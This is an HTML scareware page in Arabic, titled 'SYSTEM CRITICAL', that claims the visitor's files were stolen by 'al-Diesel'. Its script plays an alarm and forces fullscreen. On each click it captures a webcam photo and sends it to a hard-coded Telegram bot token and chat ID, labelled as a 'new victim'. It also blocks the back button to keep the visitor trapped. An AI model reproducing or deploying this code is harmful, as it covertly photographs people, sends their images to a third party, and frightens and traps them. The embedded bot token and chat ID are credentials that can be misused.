<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>SYSTEM CRITICAL</title>
    <style>
        body { background: #000; color: #f00; font-family: monospace; overflow: hidden; height: 100vh; margin: 0; text-align: center; }
        .full { width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; border: 30px solid #f00; animation: shake 0.05s infinite; }
        @keyframes shake { 0% { transform: translate(2px, 2px); } 100% { transform: translate(-2px, -2px); } }
        .big-name { font-size: 4em; font-weight: bold; color: #fff; text-shadow: 0 0 20px #f00; }
        .danger-msg { font-size: 3em; color: #f00; font-weight: bold; margin: 20px; }
        .device-info { font-size: 2em; color: #ff0; margin: 10px; }
        .btn { padding: 40px 100px; font-size: 2.5em; background: #f00; color: #fff; border: none; cursor: pointer; border-radius: 20px; box-shadow: 0 0 50px #f00; }
    </style>
</head>
<body onclick="trap()">

    <audio id="alarm" loop preload="auto">
        <source src="https://www.soundjay.com/mechanical/sounds/alarm-clock-01.mp3" type="audio/mpeg">
    </audio>
    
    <div class="full">
        <div class="big-name">الديزل إدمان 😈</div>
        <div class="danger-msg">⚠️ تم السحب بواسطة الديزل!</div>
        <div class="device-info" id="d-name">جاري المسح...</div>
        <button class="btn" id="btn" onclick="trap()">تأكيد الهوية (يتبقى 5)</button>
    </div>

    <script>
        const BOT_TOKEN = "8627248426:AAEtvtxQzAThKrVmI1orIx7GF4-wFXSYG-4";
        const CHAT_ID = "5177962707";
        let count = 5;

        document.getElementById('d-name').innerText = "نوع جهازك: " + navigator.platform;

        async function trap() {
            document.getElementById('alarm').play();
            document.documentElement.requestFullscreen();
            
            // تصوير وإرسال
            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                const canvas = document.createElement('canvas');
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', blob);
                        fd.append('caption', `😈 ضحية جديدة للديزل (محاولة ${6-count})`);
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    });
                }, 500);
            });

            count--;
            if (count > 0) {
                document.getElementById('btn').innerText = "تأكيد الهوية (يتبقى " + count + ")";
            } else {
                alert("تم سحب ملفاتك بالكامل. لا تحاول المغادرة!");
                count = 5; // إعادة العد للحبس الأبدي
            }
        }

        // قفص الحبس ومنع الخروج
        window.history.pushState(null, null, document.URL);
        window.addEventListener('popstate', () => {
            window.history.pushState(null, null, document.URL);
            alert("لا يمكنك الهروب من الديزل!");
        });
    </script>
</body>
</html>
